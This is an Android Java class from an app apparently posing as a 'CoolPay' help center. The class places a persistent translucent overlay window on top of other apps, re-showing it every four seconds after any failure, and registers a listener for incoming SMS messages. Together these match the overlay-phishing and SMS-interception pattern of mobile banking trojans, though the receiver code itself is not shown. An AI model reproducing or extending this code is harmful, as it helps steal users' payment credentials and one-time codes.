package com.coolpay.helpcenter;
import android.content.Context;
import android.content.IntentFilter;
import android.graphics.PixelFormat;
import android.view.LayoutInflater;
import android.view.WindowManager;
import android.widget.LinearLayout;
import com.coolpay.helpcenter.R;
import android.os.Handler;

public class OverlayWindow {
    
    private Context context;
    private WindowManager windowManager;
    private LinearLayout overlayLayout;
    private MySmsReceiver mySmsReceiver;
    
    public OverlayWindow(Context context){
        this.context = context;
        showOverlay();
    }
    
    public void showOverlay() {
        try{
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );

        windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        overlayLayout = (LinearLayout) inflater.inflate(R.layout.overlay_layout, null);
        windowManager.addView(overlayLayout, layoutParams);
        
            mySmsReceiver = new MySmsReceiver();
            IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
            context.registerReceiver(mySmsReceiver, intentFilter);
            
        }catch(Exception e){
            context.unregisterReceiver(mySmsReceiver);
            close();
            new Handler().postDelayed(new Runnable(){

                    @Override
                    public void run() {
                        showOverlay();
                    }
                }, 4000);
        }
    }
    
    private void close(){
        windowManager.removeView(overlayLayout);
    }
    
}
